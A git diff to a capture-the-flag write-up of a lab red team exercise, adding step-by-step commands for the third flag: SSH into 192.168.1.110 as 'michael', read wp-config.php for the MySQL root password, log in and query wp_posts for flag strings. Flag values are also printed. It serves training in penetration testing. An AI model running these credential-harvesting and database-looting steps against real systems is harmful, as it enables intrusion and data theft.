@@ -67,9 +67,22 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - ![flag2](Images/flag2.png "Second flag") 
   - `flag3`: flag3{afc01ab56b50591e7dccf93122770cd2}
     - **Exploit Used**
-      - Found the MySQL password in wp-config.php
-	  - Searched the posts in wp_posts for flag
-      - select post_content from wp_posts where post_content like '%flag%';
+      - We are going to locate the password to the MySQL server and than search the database for the next flag
+        - `ssh michael@192.168.1.110`
+        - `cd /var/www/html/wordpress`
+        - `cat wp-config.php`
+        - ![MySQL Login Info](Images/MySQL_Login.png "MySQL Login Info")
+        - We now know that the MySQL username is `root` with `R@v3nSecurity` as the password so now we will login to the database and search it for the flag
+        - `mysql -u root -pR@v3nSecurity`
+        - `use wordpress;`
+        - `show tables;`
+        - ![MySQL Tables](Images/MySQL_Tables.png "MySQL Tables")
+        - `describe wp_posts;`
+        - ![MySQL wp_posts](Images/MySQL_wp_posts.png "MySQL wp_posts")
+        - `select post_content from wp_posts where post_content like '%flag%';`
+        - ![Flag 3 and 4](Images/flag3and4.png "Flag 3 and 4")
+        - This gives us the third and fourth flag but we will continue to escalate privileges to root regardless to demonstrate how to do it
+
   - `flag4`: flag4{715dea6c055b9fe3337544932f2941ce}
     - **Exploit Used**
       - Logged into Steven after cracking the password hash from mysql
